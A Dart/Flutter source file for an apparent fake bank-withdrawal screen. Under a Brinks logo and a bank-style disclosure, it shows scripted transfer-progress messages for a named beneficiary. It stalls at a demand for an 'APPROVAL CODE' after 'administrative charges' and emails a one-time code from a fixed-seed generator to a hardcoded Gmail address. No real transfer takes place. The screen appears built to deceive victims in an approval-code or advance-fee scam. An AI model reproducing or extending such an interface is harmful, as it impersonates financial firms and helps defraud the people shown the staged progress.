import 'dart:async';
import 'dart:math';

import 'package:email_sender/email_sender.dart';
import 'package:flutter/material.dart';
import 'package:flutter_playground/models/withdraw_data.dart';
import 'package:flutter_playground/utils/theme.dart';
import 'package:flutter_spinkit/flutter_spinkit.dart';

class Processing extends StatefulWidget {
  final WithdrawData data;
  const Processing({super.key, required this.data});

  @override
  State<Processing> createState() => _ProcessingState();
}

class _ProcessingState extends State<Processing> {
  List<String> textList = [
    'Transaction in progress',
    '*** Eran Mendez | 1234567890 | USD 100 | Academy Bank *** ',
    'TRANSACTION IN PROGRESS \n*** Eran Mendez | 1234567890 | USD 100 | Academy Bank ***',
    'ACCOUNT DETAIL VERIFIED \n*** Eran Mendez | 1234567890 | USD 100 | Academy Bank ***',
    'YOUR TRANSFER DATA IS BEING PROCESS \n*** Eran Mendez | 1234567890 | USD 100 | Academy Bank *** ',
    'TRANSFER DATA PROCESSED ::: CONTACTING BENEFICIARY BANK(Eran Mendez)',
    '12%......OF TRANSFER DATA COMPLETED \n*** Eran Mendez | 1234567890 | USD 100 | Academy Bank ***',
    '19%......OF TRANSFER DATA COMPLETED',
    'PLEASE WAIT WHILE YOUR TRANSACTION IS PROCESSING...',
    '35%......OF TRANSFER DATA COMPLETED \n*** Eran Mendez | 1234567890 | USD 100 | Academy Bank *** ',
    '42%......PROCESSING ALL CHARGES',
    '50%......PROCESSING ADMINISTRATIVE CHARGES',
    'ADMINISTRATIVE CHARGES PROCESSED SUCCESSFULLY',
    'TERMINATING TRANSFER \n*** Eran Mendez | 1234567890 | USD 100 | Academy Bank ***',
    '60%......TRANSFER TERMINATED *** APPROVAL CODE *** NEEDED TO PROCEED',
  ];
  int currentIndex = 0;
  late Timer timer;

  @override
  void initState() {
    // TODO: implement initState
    super.initState();
    timer = Timer.periodic(const Duration(seconds: 4), (timer) async {
      updateList();
      // cancel timer if currentIndex == textList.length -1
      if (currentIndex == textList.length - 1) {
        timer.cancel();
        //random 6 digit number
        final random = Random(6);
        int otp = random.nextInt(900000) + 100000;

        // send email to the user email address
        final emailSender = EmailSender();
        final response = await emailSender.sendOtp(
            "eranmendez508@gmail.com",
            otp);
        print("======================");
        print(response);
        print("======================");

      }
    });
  }

  void updateList() {
    setState(() {
      currentIndex += 1;
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
        body: Container(
      padding: const EdgeInsets.all(20),
      width: double.infinity,
      child: Column(
        mainAxisAlignment: MainAxisAlignment.spaceEvenly,
        children: [
          Image.asset(
            "assets/images/brinks-logo-blue.png",
            height: 25,
          ),
          Container(
            width: 150,
            padding: const EdgeInsets.all(20),
            decoration: BoxDecoration(color: Colors.grey.withOpacity(0.6)),
            child: const SpinKitHourGlass(size: 100, color: Colors.blue),
          ),
          const SizedBox(
            height: 10,
          ),
          Text(
            textList[currentIndex],
            textAlign: TextAlign.center,
            style: contentStyle,
          ),
          Container(
            padding: const EdgeInsets.all(20),
            decoration: BoxDecoration(
              borderRadius: const BorderRadius.all(Radius.circular(20)),
                color: Colors.grey.withOpacity(0.4)),
            child: Text(
              "All electronic fund transfers to or from your accounts at Brents "
              "are governed by the Electronic Fund Transfer Disclosure provided to you "
              "when you established your account or when your requested other"
              "electronic fund transfer services",
              textAlign: TextAlign.center,
              style: contentWhiteBoldStyle,
            ),
          )
        ],
      ),
    ));
  }
}
